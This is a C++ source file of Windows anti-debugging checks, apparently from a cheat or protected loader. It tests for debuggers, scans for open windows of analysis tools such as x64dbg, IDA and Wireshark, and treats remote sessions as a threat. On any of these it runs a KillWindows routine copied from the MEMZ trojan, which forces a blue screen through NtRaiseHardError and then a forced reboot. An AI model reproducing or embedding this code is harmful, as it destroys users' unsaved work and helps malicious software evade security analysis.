//#include "../includes/includes.hpp"
#include <Windows.h>
#include <process.h>
#include <TlHelp32.h>
#include <Shlobj.h>
//#include <d3dx9.h>
#include <Psapi.h>
#include <intrin.h>
#include "lazy_importer.h"

#include <winternl.h>

typedef NTSTATUS(WINAPI* pNtQueryInformationProcess)(IN  HANDLE, IN  UINT, OUT PVOID, IN ULONG, OUT PULONG);

void KillWindows() //https://github.com/Leurak/MEMZ/blob/9f09ca4ae78b1e024c35a912a3dcebd8705d259d/WindowsTrojan/Source/Destructive/KillWindows.c
{
	//MessageBoxA(nullptr, ("error code: #41"), ("error code: #41"), MB_OK);
	// Try to force BSOD first
	// I like how this method even works in user mode without admin privileges on all Windows versions since XP (or 2000, idk)...
	// This isn't even an exploit, it's just an undocumented feature.
#ifndef _DEBUG
	HMODULE ntdll = LI_FN(LoadLibraryA)(("ntdll"));
	FARPROC RtlAdjustPrivilege = GetProcAddress(ntdll, ("RtlAdjustPrivilege"));
	FARPROC NtRaiseHardError = GetProcAddress(ntdll, ("NtRaiseHardError"));

	if (RtlAdjustPrivilege != NULL && NtRaiseHardError != NULL) {
		BOOLEAN tmp1; DWORD tmp2;
		((void(*)(DWORD, DWORD, BOOLEAN, LPBYTE))RtlAdjustPrivilege)(19, 1, 0, &tmp1);
		((void(*)(DWORD, DWORD, DWORD, DWORD, DWORD, LPDWORD))NtRaiseHardError)(0xc0000022, 0, 0, 0, 6, &tmp2);
	}

	// If the computer is still running, do it the normal way
	HANDLE token;
	TOKEN_PRIVILEGES privileges;

	LI_FN(OpenProcessToken)(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token);

	LookupPrivilegeValueA(NULL, SE_SHUTDOWN_NAME, &privileges.Privileges[0].Luid);
	privileges.PrivilegeCount = 1;
	privileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	AdjustTokenPrivileges(token, FALSE, &privileges, NULL, (PTOKEN_PRIVILEGES)nullptr, 0);

	// The actual restart
	LI_FN(ExitWindowsEx)(EWX_REBOOT | EWX_FORCE, SHTDN_REASON_MAJOR_HARDWARE | SHTDN_REASON_MINOR_DISK);
#endif
}

__forceinline bool is_dbg_present_peb() {
	//PPEB pPeb = (PPEB)__readfsdword(0x30);
	//return pPeb->BeingDebugged == 1;
	return false;
	
}
__forceinline bool NtQueryInformationProcess_ProcessDebugPort()
{
	auto NtQueryInfoProcess = (pNtQueryInformationProcess)GetProcAddress(LoadLibrary(("ntdll.dll")), ("NtQueryInformationProcess"));
	// Other Vars
	NTSTATUS Status;

	DWORD dProcessInformationLength = sizeof(ULONG);
	DWORD32 IsRemotePresent = 0;

	Status = NtQueryInfoProcess(GetCurrentProcess(), ProcessDebugPort, &IsRemotePresent, dProcessInformationLength, NULL);
	if (Status == 0x00000000 && IsRemotePresent != 0)
		return TRUE;
	else
		return FALSE;
}
__forceinline bool NtQueryInformationProcess_ProcessDebugFlags()
{
	// ProcessDebugFlags
	const int ProcessDebugFlags = 0x1f;

	auto NtQueryInfoProcess = (pNtQueryInformationProcess)GetProcAddress(LoadLibrary(("ntdll.dll")), ("NtQueryInformationProcess"));

	// Other Vars
	NTSTATUS Status;
	DWORD NoDebugInherit = 0;

	Status = NtQueryInfoProcess(GetCurrentProcess(), ProcessDebugFlags, &NoDebugInherit, sizeof(DWORD), NULL);
	if (Status == 0x00000000 && NoDebugInherit == 0)
		return TRUE;
	else
		return FALSE;
}
__forceinline bool HardwareBreakpoints()
{
	BOOL bResult = FALSE;
	PCONTEXT ctx = PCONTEXT(VirtualAlloc(NULL, sizeof(CONTEXT), MEM_COMMIT, PAGE_READWRITE));

	if (ctx) {

		SecureZeroMemory(ctx, sizeof(CONTEXT));
		ctx->ContextFlags = CONTEXT_DEBUG_REGISTERS;

		// Get the registers
		if (LI_FN(GetThreadContext)(GetCurrentThread(), ctx)) {
			if (ctx->Dr0 != 0 || ctx->Dr1 != 0 || ctx->Dr2 != 0 || ctx->Dr3 != 0)
				bResult = TRUE;
		}

		LI_FN(VirtualFree)(ctx, 0, MEM_RELEASE);
	}

	return bResult;
}
__forceinline bool SharedUserData_KernelDebugger()
{
	// The fixed user mode address of KUSER_SHARED_DATA
	const ULONG_PTR UserSharedData = 0x7FFE0000;

	// UserSharedData->KdDebuggerEnabled is a BOOLEAN according to ntddk.h, which gives the false impression that it is
	// either true or false. However, this field is actually a set of bit flags, and is only zero if no debugger is present.
	const UCHAR KdDebuggerEnabledByte = *(UCHAR*)(UserSharedData + 0x2D4); // 0x2D4 = the offset of the field

	// Extract the flags.
	// The meaning of these is the same as in NtQuerySystemInformation(SystemKernelDebuggerInformation).
	// Normally if a debugger is attached, KdDebuggerEnabled is true, KdDebuggerNotPresent is false and the byte is 0x3.
	const BOOLEAN KdDebuggerEnabled = (KdDebuggerEnabledByte & 0x1) == 0x1;
	const BOOLEAN KdDebuggerNotPresent = (KdDebuggerEnabledByte & 0x2) == 0;

	if (KdDebuggerEnabled || !KdDebuggerNotPresent)
		return TRUE;

	return FALSE;
}

typedef NTSTATUS(NTAPI* pfnNtSetInformationThread)(
	_In_ HANDLE ThreadHandle,
	_In_ ULONG  ThreadInformationClass,
	_In_ PVOID  ThreadInformation,
	_In_ ULONG  ThreadInformationLength
	);
const ULONG ThreadHideFromDebugger = 0x11;

bool IsRemoteSession()
{
	const int session_metrics = GetSystemMetrics(SM_REMOTESESSION);
	return session_metrics != 0;
}

__forceinline void check_windows() {
	if (LI_FN(FindWindowA).cached()(nullptr, ("x64dbg"))
		|| LI_FN(FindWindowA).cached()(nullptr, ("Scylla"))
		|| LI_FN(FindWindowA).cached()(nullptr, ("Scylla_x64"))
		|| LI_FN(FindWindowA).cached()(nullptr, ("HxD"))
		|| LI_FN(FindWindowA).cached()(nullptr, ("Detect It Easy"))
		|| LI_FN(FindWindowA).cached()(nullptr, ("ollydbg"))
		|| LI_FN(FindWindowA).cached()(nullptr, ("x96dbg"))
		|| LI_FN(FindWindowA).cached()(nullptr, ("ida"))
		|| LI_FN(FindWindowA).cached()(nullptr, ("ida64"))
		|| LI_FN(FindWindowA).cached()(nullptr, ("Wireshark"))
		|| LI_FN(FindWindowA).cached()(nullptr, ("snowman"))
		|| LI_FN(FindWindowA).cached()(nullptr, ("Open Server x64"))
		|| LI_FN(FindWindowA).cached()(nullptr, ("Open Server x86"))
		|| LI_FN(FindWindowA).cached()(nullptr, ("Progress Telerik Fiddler Web Debugger"))
		|| LI_FN(FindWindowA).cached()(nullptr, ("The Wireshark Network Analyzer"))
		|| LI_FN(FindWindowA).cached()(nullptr, ("HTTP Debugger")))
	{
		KillWindows();
	}
}
void HideFromDebugger()
{
	HMODULE hNtDll = LoadLibrary(("ntdll.dll"));
	pfnNtSetInformationThread NtSetInformationThread = (pfnNtSetInformationThread)GetProcAddress(hNtDll, ("NtSetInformationThread"));
	NTSTATUS status = NtSetInformationThread(GetCurrentThread(),
		ThreadHideFromDebugger, NULL, 0);
}
void uc_SizeOfImage(void)
{

}

__forceinline void Check()
{
	check_windows();
	if (is_dbg_present_peb() || NtQueryInformationProcess_ProcessDebugPort() || NtQueryInformationProcess_ProcessDebugFlags() || HardwareBreakpoints() ||
		SharedUserData_KernelDebugger() || IsRemoteSession()) {
		KillWindows();
	}
}